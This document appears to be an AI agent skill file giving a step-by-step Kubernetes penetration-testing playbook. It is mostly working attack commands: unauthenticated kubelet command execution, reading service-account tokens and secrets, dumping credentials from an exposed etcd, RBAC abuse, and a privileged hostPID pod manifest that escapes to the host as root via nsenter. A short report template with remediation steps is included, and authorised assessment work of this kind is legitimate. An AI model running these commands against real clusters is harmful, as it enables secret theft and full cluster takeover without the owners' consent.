---
name: tech-kubernetes
description: "Kubernetes cluster security assessment. API server enumeration, kubelet exploitation, etcd access, RBAC misconfigurations, pod escape, privilege escalation, service account abuse. Triggers: 'kubernetes', 'k8s', 'kubelet', 'etcd', 'rbac', 'kube-hunter', 'kube-bench', 'pod escape', 'service account', 'k8s pentest'."
---

# Kubernetes Security Assessment

Full K8s pentest: external enumeration → auth bypass → etcd → RBAC → pod escape → cluster admin.

## Install

```bash
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl && mv kubectl /usr/local/bin/

pip install kube-hunter --break-system-packages

curl -L https://github.com/aquasecurity/kube-bench/releases/latest/download/kube-bench_linux_amd64.tar.gz \
  | tar xz && mv kube-bench /usr/local/bin/

curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin
```

---

## Phase 1: External Enumeration

```bash
TARGET="https://TARGET_IP"

nmap -sV -p 6443,8080,2379,2380,10250,10255,10256 TARGET_IP

curl -k $TARGET:6443/api
curl -k $TARGET:6443/version
curl -k $TARGET:8080/api 2>/dev/null   # insecure port

for ep in "/api" "/api/v1" "/apis" "/version" "/healthz" "/metrics" "/swagger-ui" \
          "/openapi/v2" "/api/v1/namespaces" "/api/v1/pods"; do
  status=$(curl -o /dev/null -sk -w '%{http_code}' "$TARGET:6443$ep")
  [ "$status" = "200" ] && echo "[+] Anonymous: $ep"
done
```

---

## Phase 2: Kubelet Exploitation

```bash

curl -sk http://NODE_IP:10255/pods | jq '.items[].metadata.name'
curl -sk http://NODE_IP:10255/stats/summary
curl -sk http://NODE_IP:10255/metrics

curl -sk https://NODE_IP:10250/pods --header "Authorization: Bearer $TOKEN"

curl -sk https://NODE_IP:10250/run/<namespace>/<pod>/<container> \
  -X POST -d "cmd=id"
```

---

## Phase 3: Service Account Token Abuse

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://kubernetes.default.svc"
CACERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

curl -s $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  --header "Authorization: Bearer $TOKEN" --cacert $CACERT \
  -X POST -H "Content-Type: application/json" \
  -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"$NS\"}}"

curl -s "$APISERVER/api/v1/namespaces/$NS/pods" \
  --header "Authorization: Bearer $TOKEN" --cacert $CACERT | jq '.items[].metadata.name'

curl -s "$APISERVER/api/v1/namespaces/$NS/secrets" \
  --header "Authorization: Bearer $TOKEN" --cacert $CACERT | jq '.items[].data'
```

---

## Phase 4: etcd Access (Credential Dump)

```bash

curl -sk http://TARGET_IP:2379/v3/kv/range \
  -X POST -H "Content-Type: application/json" \
  -d '{"key":"Cg=="}' | base64 -d

ETCDCTL_API=3 etcdctl --endpoints=http://TARGET_IP:2379 get / --prefix --keys-only

ETCDCTL_API=3 etcdctl --endpoints=http://TARGET_IP:2379 \
  get /registry/secrets --prefix | grep -A5 "serviceaccount"

ETCDCTL_API=3 etcdctl --endpoints=http://TARGET_IP:2379 get "" --prefix \
  | strings | grep -i "token\|secret\|password"
```

---

## Phase 5: RBAC Analysis

```bash
kubectl get clusterrolebindings -o json | jq '.items[] | 
  select(.subjects[]?.kind == "ServiceAccount") | 
  {name: .metadata.name, role: .roleRef.name, subjects: .subjects}'

kubectl get clusterroles -o json | jq '.items[] | 
  select(.rules[]?.verbs[]? == "*") | .metadata.name'

kubectl auth can-i --list --as system:serviceaccount:<ns>:<sa>

kubectl auth can-i --list

# - pods/exec             → exec into any pod
# - secrets (get/list)    → read all secrets
# - pods (create)         → create privileged pod → escape
# - clusterrolebindings   → grant self cluster-admin
```

---

## Phase 6: Privilege Escalation via Pod Creation

```bash

cat << 'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privesc-pod
spec:
  hostPID: true
  hostNetwork: true
  hostIPC: true
  containers:
  - name: privesc
    image: ubuntu:latest
    command: ["/bin/bash", "-c", "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash"]
    stdin: true
    tty: true
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF

kubectl exec -it privesc-pod -- /bin/bash

```

---

## Phase 7: Automated Scanning

```bash
kube-hunter --remote TARGET_IP
kube-hunter --cidr 10.0.0.0/24

kube-bench --version   # auto-detect K8s version
kube-bench master      # check control plane
kube-bench node        # check nodes

trivy image nginx:latest
trivy image --severity HIGH,CRITICAL nginx:latest

kubectl get pods -A -o json | jq -r '.items[].spec.containers[].image' | sort -u \
  | while read img; do trivy image --severity CRITICAL "$img"; done
```

---

## Phase 8: Report Template

```markdown
## Kubernetes Security Assessment

**Cluster:** TARGET_IP:6443
**Version:** v1.X.X

### Findings

| Finding | Severity | Detail |
|:---|:---:|:---|
| Anonymous API access | Critical | /api/v1/pods accessible unauthenticated |
| Kubelet unauthenticated | High | :10255 exposes pod list + metrics |
| etcd exposed | Critical | Secrets readable without auth |
| Wildcard RBAC | High | ServiceAccount has * on * |
| Privileged pod creation | Critical | SA can create pods → host escape |

### Remediation

1. Disable anonymous API access: `--anonymous-auth=false`
2. Enable kubelet authentication: `--authentication-token-webhook=true`
3. Restrict etcd: enable TLS client certs, firewall port 2379
4. Audit RBAC: remove wildcard permissions
5. Enable PodSecurityAdmission policy
```

---

## Output

Save to `.omop/engagement/tech/kubernetes/`:
- `api-recon.txt` — anonymous endpoint results
- `kubelet-output.txt` — kubelet enumeration
- `rbac-analysis.txt` — overprivileged accounts
- `kube-hunter-report.json`
- `kube-bench-report.txt`

## Next Phase

→ `post-container-escape` for pod/container breakout
→ `ad-attacks` if K8s runs on AD-joined nodes
→ `pentest-report` for final report
